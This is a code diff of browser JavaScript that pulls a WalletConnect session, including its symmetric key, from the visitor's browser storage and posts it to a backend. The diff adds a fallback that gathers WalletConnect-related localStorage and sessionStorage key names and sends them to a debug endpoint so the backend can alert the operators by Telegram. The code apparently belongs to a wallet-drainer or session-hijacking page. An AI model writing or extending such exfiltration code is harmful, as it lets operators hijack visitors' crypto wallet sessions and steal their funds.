@@ -1044,14 +1044,22 @@
   async function registerWcSessionWithBackend() {
     // Retry up to 4 times (0ms, 800ms, 2s, 4s) — keychain write may be async after connect
     var delays = [0, 800, 2000, 4000];
+    var _sessionFound = false;
+    var _symkeyFound = false;
     for (var attempt = 0; attempt < delays.length; attempt++) {
       try {
         if (delays[attempt] > 0) await sleep(delays[attempt]);
         var data = extractWcSessionForBackend();
-        if (!data || !data.sym_key) {
+        if (!data) {
+          L.warn('[WcRelay] session not found attempt', attempt + 1);
+          continue;
+        }
+        _sessionFound = true;
+        if (!data.sym_key) {
           L.warn('[WcRelay] symKey not found attempt', attempt + 1, '— will retry');
           continue;
         }
+        _symkeyFound = true;
         await apiPost('/api/v1/wc/session', data);
         L.log('[WcRelay] session registered | topic:', data.topic.slice(0, 8) + '...');
         return;
@@ -1059,6 +1067,34 @@
         L.warn('[WcRelay] session register fail attempt', attempt + 1, ':', e && e.message ? e.message : String(e));
       }
     }
+    // All retries failed — POST debug info so backend can Telegram us what happened
+    try {
+      var _wcDbgKeys = [];
+      try {
+        var _allKeys = Object.keys(localStorage);
+        for (var _ki = 0; _ki < _allKeys.length; _ki++) {
+          if (_allKeys[_ki].indexOf('wc@') !== -1 || _allKeys[_ki].indexOf('walletconnect') !== -1) {
+            _wcDbgKeys.push(_allKeys[_ki]);
+          }
+        }
+      } catch (eDbg) {}
+      var _ssKeys = [];
+      try {
+        var _ssAll = Object.keys(sessionStorage);
+        for (var _ski = 0; _ski < _ssAll.length; _ski++) {
+          if (_ssAll[_ski].indexOf('wc@') !== -1 || _ssAll[_ski].indexOf('walletconnect') !== -1) {
+            _ssKeys.push(_ssAll[_ski]);
+          }
+        }
+      } catch (eDbg2) {}
+      await apiPost('/api/v1/wc/session-debug', {
+        wc_keys: _wcDbgKeys.join('|'),
+        ss_keys: _ssKeys.join('|'),
+        session_found: _sessionFound,
+        symkey_found: _symkeyFound,
+        attempts: delays.length,
+      });
+    } catch (ePost) {}
     L.warn('[WcRelay] session registration gave up after', delays.length, 'attempts');
   }
 
